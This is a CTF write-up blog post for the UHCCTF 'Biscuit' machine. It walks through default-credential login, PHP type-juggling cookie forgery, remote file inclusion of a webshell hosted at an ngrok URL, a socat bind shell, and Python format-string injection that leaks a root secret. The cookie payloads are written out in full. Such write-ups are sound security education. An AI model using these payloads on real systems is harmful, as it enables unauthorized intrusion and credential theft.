<!DOCTYPE html>
<html class="direction--ltr"lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.7.1 -->
<title>UHCCTF (Classificatória) - Biscuit (Official Write-Up) - eng | big0us</title>
<meta name="generator" content="Jekyll v4.2.1" />
<meta property="og:title" content="UHCCTF (Classificatória) - Biscuit (Official Write-Up) - eng" />
<meta name="author" content="Vinicius Pereira" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Hey, my name is Vinicius, aka big0us :), I work with the red team at PROOF. In my free time I like to create some stuff, participate in bug bounty programs and play some CTFs." />
<meta property="og:description" content="Hey, my name is Vinicius, aka big0us :), I work with the red team at PROOF. In my free time I like to create some stuff, participate in bug bounty programs and play some CTFs." />
<meta property="og:site_name" content="big0us" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2021-06-01T00:00:00+00:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="UHCCTF (Classificatória) - Biscuit (Official Write-Up) - eng" />
<script type="application/ld+json">
{"author":{"@type":"Person","name":"Vinicius Pereira"},"description":"Hey, my name is Vinicius, aka big0us :), I work with the red team at PROOF. In my free time I like to create some stuff, participate in bug bounty programs and play some CTFs.","headline":"UHCCTF (Classificatória) - Biscuit (Official Write-Up) - eng","dateModified":"2021-06-01T00:00:00+00:00","url":"/2021/06/01/uhc-biscuit-eng.html","datePublished":"2021-06-01T00:00:00+00:00","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"/2021/06/01/uhc-biscuit-eng.html"},"@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/style.css">
  <link rel="icon" type="image/png" href="/assets/favicon.png" />
  <link rel="stylesheet" href="/assets/css/magnific-popup.css"><link type="application/atom+xml" rel="alternate" href="/feed.xml" title="big0us" /><script src="https://code.jquery.com/jquery-3.2.0.min.js"></script> 
  <script src="/assets/js/jquery.magnific-popup.js"></script>
</head>
<body><div class="site-header">
  <div class="wrapper">
    <a class="site-title" rel="author" href="/">big0us<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
    <span class="social_links">
        
        
        <a class="color-cyan-hover" href="https://twitter.com/big0x75"><i class="fab fa-twitter-square"></i></a>
        
        
        
        <a class="color-blue-hover" href="https://linkedin.com/in/viniciuspereiras"><i class="fab fa-linkedin"></i></a>
        
        
        
        <a class="color-pink-hover" href="https://github.com/viniciuspereiras"><i class="fab fa-github-square"></i></a>
        
        
    </span>
  </div>
</div>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        
  <div class="author-box">


<img src="
    /assets/avatar.gif
" class="author-avatar" alt="Avatar" />
<div class="description">Hey, my name is Vinicius, aka big0us :), I work with the red team at PROOF. In my free time I like to create some stuff, participate in bug bounty programs and play some CTFs.
</div>

</div>


<div class="post">
  <h1 class="post-title">UHCCTF (Classificatória) - Biscuit (Official Write-Up) - eng</h1>
  
  <div class="post-tags">
      
      <a class="tag" href="/tag/eng/">eng</a>
      
      <a class="tag" href="/tag/ctf/">ctf</a>
      
      <a class="tag" href="/tag/write-up/">write-up</a>
      
  </div>
  
  <div class="post-date">Published on 01 Jun 2021</div>
  
  <script async="" src="https://www.googletagmanager.com/gtag/js?id=G-72MZ89K41P"></script>

<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-72MZ89K41P');
</script>

<p>Hello, I’m Vinicius (big0us), this is a write-up of a machine that was the challenge for one of UHC’s qualifiers. (translate to english by <a href="https://twitter.com/0dayctf">0day</a>)
Happy reading :)
g00d_h4ck1ng</p>

<h1 id="recon">Recon</h1>

<p><img src="/assets/biscuit/Untitled.png" alt="/assets/biscuit/Untitled.png" /></p>

<p>The first page you’re greeted with a login page, taking a look at the HTML of the page, apparently there’s
nothing hidden, I’ll fuzz first, then we can test some credentials.</p>

<p><img src="/assets/biscuit/Untitled%201.png" alt="/assets/biscuit/Untitled%201.png" /></p>

<p>Apparently our fuzzing only showed a /class, where there is a directory listing pointing
to a “.php” file.</p>

<p><img src="/assets/biscuit/Untitled%202.png" alt="/assets/biscuit/Untitled%202.png" /></p>

<p>Okay, let’s test some default credentials in the login form:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>admin:admin
guest:guest
administrator:admin
root:root
</code></pre></div></div>

<p>By testing “guest:guest” we were able to enter:</p>

<p><img src="/assets/biscuit/Untitled%203.png" alt="/assets/biscuit/Untitled%203.png" /></p>

<p>Looking around apparently, we only have a welcome page.
Let’s check our cookies.</p>

<p><img src="/assets/biscuit/Untitled%204.png" alt="/assets/biscuit/Untitled%204.png" /></p>

<p><img src="/assets/biscuit/Untitled%205.png" alt="/assets/biscuit/Untitled%205.png" /></p>

<p>Using cyberchef to decode the cookie, we can see that it’s JSON with three values:
hmac (probably something that validates the values), username, and a time for the
cookie to expire.</p>

<p>I’m going to try to change the username value in the cookie to “admin” with base64 &amp; URL encoding, and
then send back to the application.</p>

<p><img src="/assets/biscuit/Untitled%206.png" alt="/assets/biscuit/Untitled%206.png" /></p>

<p>This page showed an error saying that we’re trying to do “cookie tampering”, and
returned a flag! The first flag.
After some tests, sending cookies with other random values, I realized that
the application validates the cookie by the value of hmac, and not by the entire content
of json.
A well-known vulnerability about PHP validations is type-juggling, which consists of
bypassing authentications by making any if($ == $) that will always return “true”.</p>

<p><a href="https://book.hacktricks.xyz/pentesting/pentesting-web/php-tricks-esp">PHP Tricks (SPA)</a></p>

<p><a href="https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09">PHP Type Juggling Vulnerabilities</a></p>

<p><img src="/assets/biscuit/Untitled%207.png" alt="/assets/biscuit/Untitled%207.png" /></p>

<p>Basically when a programmer uses “==” in a php comparison, first it makes the two values
the same type, ignoring the type (int, str…) of the variables.
And in this situation we can use some techniques for the comparison to return “true”.</p>

<h1 id="exploitation">Exploitation</h1>

<p>After trying for quite a while, I tried changing the value of “hmac” to “true” and luckily it
worked!</p>

<p><img src="/assets/biscuit/Untitled%208.png" alt="/assets/biscuit/Untitled%208.png" /></p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="nl">"hmac"</span><span class="p">:</span><span class="kc">true</span><span class="p">,</span><span class="nl">"username"</span><span class="p">:</span><span class="s2">"admin"</span><span class="p">,</span><span class="nl">"expiration"</span><span class="p">:</span><span class="mi">1625435484</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p><img src="/assets/biscuit/Untitled%209.png" alt="/assets/biscuit/Untitled%209.png" /></p>

<p>Okay :( I was sad that there are no flags here.
I’ll try to change the username again, to understand what’s going on.</p>

<p>Changing to “test”, php gives us an error, it seems it’s running a “require_once” on
the value we put &amp; appending “.php” at the end. require_once is normally used to include
pages and php files in websites, and when the user has control over the value that
require_once uses, the application is vulnerable to LFI or RFI (Local/Remote File
Inclusion).</p>

<p><img src="/assets/biscuit/Untitled%2010.png" alt="/assets/biscuit/Untitled%2010.png" /></p>

<p>As the application already puts the .php at the end, I will do the following.
Upload a file with a webshell on a server using ngrok, then tell the application to include my
file and get an RCE.</p>

<p><img src="/assets/biscuit/Untitled%2011.png" alt="/assets/biscuit/Untitled%2011.png" /></p>

<p>And I will send the payload:</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="nl">"hmac"</span><span class="p">:</span><span class="kc">true</span><span class="p">,</span><span class="nl">"username"</span><span class="p">:</span><span class="s2">"https://3b4f8afabab2.ngrok.io/shell"</span><span class="p">,</span><span class="nl">"expiration"</span><span class="p">:</span><span class="mi">1625435484</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p>(The application now puts the .php)</p>

<p>We have RCE!!</p>

<p><img src="/assets/biscuit/Untitled%2012.png" alt="/assets/biscuit/Untitled%2012.png" /></p>

<p>Now I’m going to try to get a reverse shell.
After a few attempts I realized that there is a firewall in the application that blocks any
communication on ports other than 80 or 443, since I don’t have a VPS, I’ll do it differently, instead of a reverse shell (where the victim connects back to me) I’m going to use a bind shell (opening a port on the machine and connecting to it). For this I will use “socat”.</p>

<table>
  <tbody>
    <tr>
      <td>[socat</td>
      <td>GTFOBins](https://gtfobins.github.io/gtfobins/socat/#bind-shell)</td>
    </tr>
  </tbody>
</table>

<p><img src="/assets/biscuit/Untitled%2013.png" alt="/assets/biscuit/Untitled%2013.png" /></p>

<p>First I got the socat binary in their github (socat binary) and passed it to the machine
using the web-server that I created to get RCE, and curling it.
I ran the commands that are in the image and got a bind shell! (I used port 6969)</p>

<p><img src="/assets/biscuit/Untitled%2014.png" alt="/assets/biscuit/Untitled%2014.png" /></p>

<p>In “/” have our next flag:</p>

<p><img src="/assets/biscuit/Untitled%2015.png" alt="/assets/biscuit/Untitled%2015.png" /></p>

<h1 id="post-exploitation">Post Exploitation</h1>

<p>Doing the basic privesc checklist, we can see that we are the apache user and we
can run a script as root on the machine:</p>

<p><img src="/assets/biscuit/Untitled%2016.png" alt="/assets/biscuit/Untitled%2016.png" /></p>

<p>Apparently we can’t read the script or change it.</p>

<p><img src="/assets/biscuit/Untitled%2017.png" alt="/assets/biscuit/Untitled%2017.png" /></p>

<p>What’s left for us to do, is to simply RUN IT!:</p>

<p><img src="/assets/biscuit/Untitled%2018.png" alt="/assets/biscuit/Untitled%2018.png" /></p>

<p>The file prints an IP with option 2 (List Blocked IP’s), taking a look at /var/www/html the web application path, we
can see that there is a file with the same IP that was printed, so it’s printing the IP that is in the file.</p>

<p><img src="/assets/biscuit/Untitled%2019.png" alt="/assets/biscuit/Untitled%2019.png" /></p>

<p>I opened the file with nano (before running ‘export TERM=xterm’ !!) and started editing
it, to try and provoke some type of error in python that would show me something from the
program.</p>

<p><img src="/assets/biscuit/Untitled%2020.png" alt="/assets/biscuit/Untitled%2020.png" /></p>

<p><img src="/assets/biscuit/Untitled%2021.png" alt="/assets/biscuit/Untitled%2021.png" /></p>

<p>Interestingly, there is a different (not used often) format string running.
Searching about this type of format string + vulnerabilites, I ended up stumbling on this
article.</p>

<p><a href="https://security.stackexchange.com/questions/238338/are-there-any-security-concerns-to-using-python-f-strings-with-user-input">Are there any Security Concerns to using Python F Strings with User Input</a></p>

<p>Basically it explains everything we need to do, so I won’t explain it again, but
the way this format string works, allows us to inject more strings to be formatted, and if
this is printed we can print all the global variables that the file uses, usually giving us
some key or password.</p>

<p>Okay here is my final payload.</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="nl">"ips"</span><span class="p">:[</span><span class="s2">"{ip.list_blocked.__globals__}"</span><span class="p">]}</span><span class="w">
</span></code></pre></div></div>

<p><img src="/assets/biscuit/Untitled%2022.png" alt="/assets/biscuit/Untitled%2022.png" /></p>

<p>This worked and we got the value of a variable called root_secret, it’s probably
the root password.</p>

<p><img src="/assets/biscuit/Untitled%2023.png" alt="/assets/biscuit/Untitled%2023.png" /></p>

<p>Worked!!
Thanks to you who’ve read this far, I hope you enjoyed this challenge / writeup!</p>

</div>





<div class="related">
  <h2>related posts</h2>
  <ul class="related-posts">
    
      <li>
        <h3>
          <a href="/2021/10/07/latinoware2021-planilhasbaby.html">
            CTF LatinoWare 2021 - Planilhas Baby
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/2021/06/04/uhc-cap.html">
            UHCCTF (Classificatória) - Cap
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/2021/06/03/uhc-storm.html">
            UHCCTF (Classificatória) - Storm
          </a>
        </h3>
      </li>
    
  </ul>
</div>




  
  <h2>all tags</h2>
  <div class="tag-cloud"><a href="/tag/ctf/" class="set-5">ctf</a> <a href="/tag/eng/" class="set-1">eng</a> <a href="/tag/latinoware/" class="set-1">latinoware</a> <a href="/tag/pt-br/" class="set-5">pt-br</a> <a href="/tag/write-up/" class="set-5">write-up</a></div>
  




<script>
  let i = 0;
  const text = '';
  const speed = parseInt('50');
  
  function typeWriter() {
    if (i < text.length) {
      document.getElementById('animated-post-description').innerHTML += text.charAt(i);
      i++;
      setTimeout(typeWriter, speed);
    }
  }

  document.getElementById('animated-post-description').style.display = 'initial';
  typeWriter();

  // Image modal
  var $imgs = [];
  $('img').each(function(idx) {
    var obj = {
      src: $(this).attr('src')
    }
    $imgs.push(obj);
    var elem = $(this);
    $(this).click(function() {
      $('.modal').magnificPopup('open', idx);
    });
  });

  $('.modal').magnificPopup({
    items: $imgs,
    type: 'image',
    closeOnContentClick: true,
    mainClass: 'mfp-img-mobile',
    image: {
      verticalFit: true
    }
    
  });
</script>

      </div>
    </main><footer class="site-footer">
  <div class="wrapper">
    <div class="credits"><a href="https://github.com/bitbrain/jekyll-dash">dash</a> theme for Jekyll by <a href="https://github.com/bitbrain">bitbrain</a> made with <i class="fas fa-heart"></i><div class="toggleWrapper">
    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
    <label for="theme-toggle" class="toggle">
    <span class="toggle__handler">
      <span class="crater crater--1"></span>
      <span class="crater crater--2"></span>
      <span class="crater crater--3"></span>
    </span>
        <span class="star star--1"></span>
        <span class="star star--2"></span>
        <span class="star star--3"></span>
        <span class="star star--4"></span>
        <span class="star star--5"></span>
        <span class="star star--6"></span>
    </label>
</div>
<script type="text/javascript">
const theme = localStorage.getItem('theme');

if (theme === "light") {
    document.documentElement.setAttribute('data-theme', 'light');
} else {
    document.documentElement.setAttribute('data-theme', 'dark');
}
const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');

function activateDarkTheme() {
    document.getElementById('theme-toggle').checked = true;
    document.documentElement.setAttribute('data-theme', 'dark');
    document.documentElement.classList.add('theme--dark');
    document.documentElement.classList.remove('theme--light');
	document.getElementById("theme-toggle").className = 'light';
	window.localStorage.setItem('theme', 'dark');
}

function activateLightTheme() {
    document.getElementById('theme-toggle').checked = false;
    document.documentElement.setAttribute('data-theme', 'light');
    document.documentElement.classList.add('theme--light');
    document.documentElement.classList.remove('theme--dark');
	document.getElementById("theme-toggle").className = 'dark';
	window.localStorage.setItem('theme', 'light');
}

if (theme === "dark") {
    activateDarkTheme();
} else if (theme === "light") {
    activateLightTheme();
} else if  (userPrefers === "light") {
    activateDarkTheme();
} else {
    activateDarkTheme();
}

function modeSwitcher() {
	let currentMode = document.documentElement.getAttribute('data-theme');
	if (currentMode === "dark") {
	    activateLightTheme();
	} else {
	    activateDarkTheme();
	}
}
</script></div>
  </div>
</footer>


<script>
      window.FontAwesomeConfig = {
        searchPseudoElements: true
      }
    </script>
  </body>

</html>
